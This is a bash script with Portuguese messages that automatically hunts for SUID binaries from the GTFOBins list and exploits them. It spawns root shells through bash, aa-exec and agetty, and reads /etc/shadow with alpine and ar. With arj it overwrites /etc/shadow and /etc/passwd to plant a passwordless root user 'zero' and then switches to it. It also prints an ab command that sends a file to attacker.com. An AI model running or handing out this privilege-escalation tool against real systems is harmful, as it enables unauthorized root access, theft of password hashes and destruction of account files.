#!/bin/bash

echo "[*] Procurando binários SUID do GTFOBins..."

SUIDS=$(find / -perm -u=s -type f 2>/dev/null)

for path in $SUIDS; do
    bin=$(basename "$path")

    case "$bin" in
        bash)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            "$path" -p
            ;;
        aa-exec)
            echo "[+] $path → aa-exec SUID encontrado!"
            "$path" /bin/sh -p
            ;;
        ab)
            echo "[+] $path → ab SUID encontrado! Teste:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "ab -p $LFILE $URL"
            ;;
        agetty)
            echo "[+] $path → agetty SUID encontrado! Teste:"
            "$path" -o -p -l /bin/sh -a root tty
            ;;
        alpine)
            echo "[+] $path → alpine SUID encontrado! Teste:"
            "$path" -F /etc/shadow
            ;;
        ar)
            echo "[+] $path → ar SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$path" r "$TF" /etc/shadow
            cat "$TF"
            rm -f "$TF" 2>/dev/null
            ;;
        arj)
            echo "[+] $path → arj SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo 'zero::666:0:99999:7:::' > "$TF/shadow"
            echo 'zero:x:1337:0::/root:/bin/bash' > "$TF/passwd"

            "$path" a "$TF/a" "$TF/shadow"
            "$path" a "$TF/a" "$TF/passwd"
            "$path" e "$TF/a" /etc

            sleep 1
            echo "[*] Tentando acessar com su zero:"
            su zero
            id       
            ;;
        *)
            continue
            ;;
    esac
done